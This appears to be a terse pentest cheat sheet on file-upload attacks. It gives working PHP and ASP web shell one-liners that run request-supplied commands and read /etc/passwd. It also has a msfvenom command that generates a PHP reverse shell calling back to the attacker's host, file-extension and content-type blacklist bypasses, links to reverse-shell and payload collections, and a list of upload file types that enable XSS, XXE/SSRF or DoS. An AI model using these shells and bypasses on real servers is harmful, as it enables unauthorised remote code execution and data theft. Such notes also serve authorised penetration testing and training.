## Web Shells
```
<?php echo file_get_contents('/etc/passwd'); ?>
<?php system('hostname'); ?>
<?php system($_REQUEST['cmd']); ?>
<% eval request('cmd') %>
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
https://github.com/Arrexel/phpbash
https://github.com/pentestmonkey/php-reverse-shell
https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
```


## Bypasses

**Client-Side
```
[CTRL+SHIFT+C]
```

**Blacklist Bypass
```
shell.phtml
shell.pHp
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
```
- PHP extensions
- ASP extensions
- Web extensions

**Content/Type Bypass
```
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
https://en.wikipedia.org/wiki/List_of_file_signatures
```

## Limited Uploads

XSS = HTML, JS, SVG, GIF
XXE/SSRF = XML, SVG, PDF, PPT, DOC
DoS = ZIP, JPG, PNG
